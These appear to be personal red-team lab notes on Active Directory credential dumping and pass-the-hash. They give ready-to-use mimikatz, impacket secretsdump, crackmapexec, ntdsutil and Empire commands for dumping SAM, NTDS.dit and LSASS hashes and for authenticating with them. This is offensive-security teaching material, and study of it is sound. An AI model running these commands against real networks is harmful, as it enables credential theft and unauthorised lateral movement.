- After compromising a domain user on the network, the next step is to gather all usernames, hashes, sensitive info., and anything that helps us pivot to compromise other machines within the network.
- This will trigger a lot of noise and will trip off alerts if we are on a stealthy red teaming engagement.


## How to steal hashes of users after getting a foothold?
1. DSync attacks
2. Extracting hashes from NTDS.dit
3. Another method is dumping lsass.exe process which stores hashes for users with active sessions to the computer.

[Credential Dumping using SAM](https://www.hackingarticles.in/credential-dumping-sam/)
```Mimikatz Way
privilege::debug
token::elevate
lsadump::sam
```
Impacket Way of dumping SAM
```Impacket
./secretsdump.py -sam /root/Desktop/sam -system /root/Desktop/system LOCAL
```
Using crackmapexec
```Crackmapexec
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sam
```

[Dumping NTDS.dit](https://www.hackingarticles.in/credential-dumping-ntds-dit/) and [Vault Notes](obsidian://open?vault=THM%20Networks&file=Knowledge%20Base%2FPass-The-Hash%2FWhat%20is%20NTDS-dit)
```Crackmapexec
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds drsuapi
```

```Powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

#After this we get the output as hive files which we then transfer back to our local machine

./secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL
#All we need is to provide the path of the SYSTEM hive file and the NTDS.dit file and we are good to go. secretsdump will extract the hashes for us
```

[Dumping LSASS](https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/)
```Task_Manager
In your local machine (target) and open the task manager, navigate to processes for exploring running process of lsass.exe and make a right-click to explore its snippet.  Choose “Create Dump File” option which will dump the stored credential.
```
- After saving the dump file from task manager, use mimikatz to get data out of the `.dmp` file.
```mimikatz
privilege::debug
sekurlsa::minidump C:\Users\raj\AppData\Local\Temp\lsass.DMP
sekurlsa::logonpasswords
```
Empire way
```powershell_empire
usemodule credentials/mimikatz/lsadump
execute
```
Crackmapexec`
```crackmapexec
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --lsa
```
Tools which can be used for getting hashes
1. Mimikatz
![[Pasted image 20221010152506.png]]


#### There are 2 techniques used for lateral movement for impersonating valid user accounts or service account using hashes
1. `Pass the hash attack`
2. `Over Pass the hash attack`


## 1. Pass-The-Hash - Local Admin rights required
- This is the initial attack where an attacker uses the dumped hashes to perform a valid NTLM authentication without accessing cleartext passwords and see if the compromised user can access other resources or systems on the network.
- So here the attacker impersonates the user from one application to another, they often engage in hash harvesting throughout the system which can be used to access more areas of the network, add account privileges, target a privileged account and set up backdoors and other gateways to enable future access.


- After getting the hashes, now we need to authentication with the stolen password hash using Pass The Hash technique.

Using mimikatz, pass the hash can be conducted by the following command
```
mimikatz sekurlsa::pth /user:<compromised user> /domain:<THROWBACK.local /ntlm:<hash>
```
- Instead of `/ntlm`, we can also use `/aes128` or `/aes256` hash option in Mimikatz




### Another ways to pass the hash
[Blog](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
